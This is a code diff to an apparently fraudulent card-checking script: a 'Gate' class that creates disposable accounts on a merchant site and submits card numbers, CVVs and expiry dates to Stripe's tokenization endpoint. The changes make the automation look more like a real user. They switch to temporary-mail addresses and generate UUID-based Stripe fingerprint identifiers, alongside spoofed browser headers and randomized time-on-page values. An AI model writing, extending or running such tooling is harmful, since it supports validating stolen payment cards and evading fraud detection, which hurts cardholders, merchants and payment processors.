@@ -64,8 +64,8 @@ class Gate:
             
             nonce = nonce_match.group(1)
             
-            # Generate random credentials
-            email = f"{self.rnd_str(8)}@gmail.com"
+            # Generate random credentials (using tempmail-like pattern)
+            email = f"{self.rnd_str(10)}@temporarymail.com"
             password = self.rnd_str(12)
             
             # Step 2: Register
@@ -93,12 +93,14 @@ class Gate:
         """Create Stripe payment method token (NO PROXY)"""
         try:
             # Format year
-            if len(yy) == 4:
-                exp_year = yy
-            elif len(yy) == 2:
+            if len(yy) == 2:
+                # Assume 20xx for 2-digit years
                 exp_year = f"20{yy}"
-            else:
+            elif len(yy) == 4:
                 exp_year = yy
+            else:
+                # Invalid year format
+                return False, "Invalid year format"
             
             # Stripe tokenization headers
             stripe_headers = {
@@ -117,15 +119,17 @@ class Gate:
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
             }
             
+            import uuid
+            
             data = {
                 'type': 'card',
                 'card[number]': cc,
                 'card[cvc]': cvv,
                 'card[exp_month]': mm,
                 'card[exp_year]': exp_year,
-                'guid': self.rnd_str(32),
-                'muid': self.rnd_str(32),
-                'sid': self.rnd_str(32),
+                'guid': str(uuid.uuid4()),
+                'muid': str(uuid.uuid4()),
+                'sid': str(uuid.uuid4()),
                 'payment_user_agent': 'stripe.js/v3',
                 'referrer': 'https://redbluechair.com',
                 'time_on_page': str(random.randint(15000, 45000)),
